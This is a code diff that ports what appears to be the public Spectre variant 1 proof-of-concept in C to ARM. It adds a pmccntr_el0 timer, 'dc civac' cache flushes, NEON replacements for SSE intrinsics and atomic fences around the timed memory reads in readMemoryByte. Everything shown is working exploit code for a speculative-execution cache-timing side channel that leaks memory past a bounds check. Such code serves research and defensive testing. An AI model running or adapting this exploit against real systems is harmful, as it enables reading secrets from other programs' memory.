@@ -15,11 +15,24 @@
 #include <stdlib.h>
 #include <stdint.h>
 #ifdef _MSC_VER
-#include <intrin.h> /* for rdtsc, rdtscp, clflush */
-#pragma optimize("gt",on)
+    #include <intrin.h> /* for rdtsc, rdtscp, clflush */
+    #pragma optimize("gt",on)
 #else
-#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
+    #ifdef __x86_64
+        #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
+    #else //arm
+        #define __rdtsc() ({ unsigned long __tmp;                             \
+                    __asm__ __volatile__ ("mrs %0, pmccntr_el0  " : "=r"(__tmp)); \
+                    __tmp; })
+        #define NORDTSCP
+        #if defined(__ARM_NEON)
+            #include <arm_neon.h>
+        #endif
+    #endif
 #endif
+
+#define dccivac(addr) ({                                                \
+            __asm__ __volatile__ ("dc civac, %0\n\t" : : "r" (addr) : "memory");})
 
 /********************************************************************
 Victim code.
@@ -71,13 +84,21 @@ void flush_memory_sse(uint8_t * addr)
 {
   float * p = (float *)addr;
   float c = 0.f;
+#if defined(__ARM_NEON)
+  float32x4_t i = {c,c,c,c};
+#else
   __m128 i = _mm_setr_ps(c, c, c, c);
+#endif
 
   int k, l;
   /* Non-sequential memory addressing by looping through k by l */
   for (k = 0; k < 4; k++)
     for (l = 0; l < 4; l++)
+#if defined(__ARM_NEON)
+      vst1q_f32(&p[(l*4+k) * 4], i);
+#else
       _mm_stream_ps(&p[(l * 4 + k) * 4], i);
+#endif
 }
 #endif
 
@@ -101,7 +122,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #ifndef NOCLFLUSH
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
+#if defined(__aarch64__)
+      dccivac( & array2[i*512]);
+#else
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
+#endif
 #else
     /* Flush array2[256*(0..255)] from cache
        using long SSE instruction several times */
@@ -114,7 +139,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
 #ifndef NOCLFLUSH
-      _mm_clflush( & array1_size);
+#if defined(__aarch64__)
+        dccivac( & array1_size);
+#else
+        _mm_clflush( & array1_size);
+#endif
 #else
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -173,13 +202,13 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       Intel and AMD.
       */
 
-      _mm_mfence();
+      __atomic_thread_fence(__ATOMIC_ACQ_REL);
       time1 = __rdtsc(); /* READ TIMER */
-      _mm_mfence();
+      __atomic_thread_fence(__ATOMIC_ACQ_REL);
       junk = * addr; /* MEMORY ACCESS TO TIME */
-      _mm_mfence();
+      __atomic_thread_fence(__ATOMIC_ACQ_REL);
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      _mm_mfence();
+      __atomic_thread_fence(__ATOMIC_ACQ_REL);
 #else
       /*
       The mfence instruction was introduced with the SSE2 instruction set, so
